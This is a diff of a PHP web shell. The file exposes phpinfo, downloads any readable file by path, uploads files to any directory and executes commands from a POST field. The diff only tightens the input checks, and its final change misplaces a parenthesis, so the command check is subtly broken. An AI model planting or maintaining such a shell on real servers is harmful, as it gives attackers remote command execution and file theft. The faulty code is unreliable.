@@ -4,7 +4,7 @@
         phpinfo();
         die();
     }
-    if(isset($_POST["submit-download"]) && isset($_POST["download-file"]) && !empty(trim($_POST["download-file"]))) {
+    if(isset($_POST["submit-download"]) && isset($_POST["download-file"]) && trim($_POST["download-file"]) !== "") {
         $file = $_POST["download-file"];
         if(is_readable($file)) {
             header('Content-Type: ' . mime_content_type($file));
@@ -17,7 +17,7 @@
         }
     }
     if(isset($_POST["submit-upload"])) {
-        if(isset($_POST["upload-dir"]) && !empty(trim($_POST["upload-dir"]))) {
+        if(isset($_POST["upload-dir"]) && trim($_POST["upload-dir"]) !== "") {
             $upload_dir = $_POST["upload-dir"];
         } else {
             $upload_dir = ".";
@@ -37,7 +37,7 @@
             }
         }
     }
-    $execute = isset($_POST["submit-cmd"]) && isset($_POST["cmd"]) && !empty(trim($_POST["cmd"]));
+    $execute = isset($_POST["submit-cmd"]) && isset($_POST["cmd"]) && trim($_POST["cmd"] !== "");
 ?>
 <!DOCTYPE html>
 <html>
